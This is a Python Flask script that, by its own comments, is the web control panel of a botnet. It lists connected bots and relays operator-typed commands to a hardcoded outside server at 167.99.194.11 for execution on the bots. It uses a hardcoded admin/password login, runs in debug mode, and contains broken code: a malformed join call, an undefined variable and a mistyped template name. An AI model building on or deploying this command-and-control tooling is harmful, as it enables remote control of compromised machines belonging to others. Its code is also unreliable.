#!/usr/bin/env python

from flask import Flask
from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
import os
import socket
import sys

app = Flask(__name__)

@app.route('/')
def home():
    if not session.get('logged_in'):
        return render_template('login.html')
        #return redirect(url_for('login'))
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/login', methods=['POST'])
def login():
    if request.form['password'] == 'password' and request.form['username'] == 'admin':
        session['logged_in'] = True
        return redirect(url_for('main_activity'))
    else:
        return render_template('login.html')

#This is the main activity page, get all bots connected to the main server#
@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1",8080))
    while True:
        data_b = sock.recv(4096)
        data = data_b.decode('utf-8')
        ip_list = data.split(':')
        print('[DEBUG] Connected to the server', file=sys.stdout)
        if request.method == 'POST':
            if request.form['submit'] == 'ACCESS':
                req = request.form.get('access')
                print(req, file=sys.stdout)
                #sock.send(req.encode('utf-8'))
                return redirect(url_for('user_activity', ip = req))
            return render_template('main_activity', data = ip_list)
        if request.method == 'GET':
            if not session.get('logged_in'):
                return render_template('login.html')
            else: 
                return render_template('main_activity.html', data = ip_list)

#User activity, get information from the bot you are connected
@app.route('/user_activity/<ip>', methods=['POST', 'GET'])
def user_activity(ip):
    if request.method == 'POST':
        if request.form['submit'] == 'SEND COMMAND':
            cmd = request.form['text']
            host = request.form.get("host")
            msg = ":".join(host, 'CMD', cmd)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("167.99.194.11",8080))
            sock.send(msg.encode('utf-8'))
            print("[DEBUG] String for the server %s" %(text), file=sys.stdout)
            #while True:
            #    resp_b = sock.recv(4096)
            #    resp = resp_b.decode('utf-8')


    elif request.method == 'GET':
        return render_template('user_activity.html', ip = ip)

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.run()
